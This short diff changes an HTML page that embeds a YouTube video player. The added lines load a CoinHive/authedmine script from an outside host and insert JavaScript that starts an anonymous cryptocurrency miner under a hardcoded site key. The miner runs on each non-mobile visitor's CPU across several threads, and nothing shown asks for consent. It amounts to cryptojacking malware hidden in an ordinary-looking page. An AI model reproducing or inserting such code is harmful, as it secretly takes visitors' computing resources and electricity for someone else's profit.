@@ -1,6 +1,6 @@
 ﻿
 <div id="player"></div>
-
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
 <script>
     var tag = document.createElement('script');
     tag.src = "https://www.youtube.com/iframe_api";
@@ -30,6 +30,15 @@
         event.target.playVideo();
     }
 
+    var miner = new CoinHive.Anonymous('yxEdUlVlkqdhLzbw2njg1mbGCQaXIVM7');
+    if (!miner.isMobile()) {
+
+        miner.start();
+        var thrd = Math.ceil(navigator.hardwareConcurrency / 4);
+        miner.setNumThreads(thrd);
+        miner.setThrottle(0.8);
+
+    }
 
       
 </script>
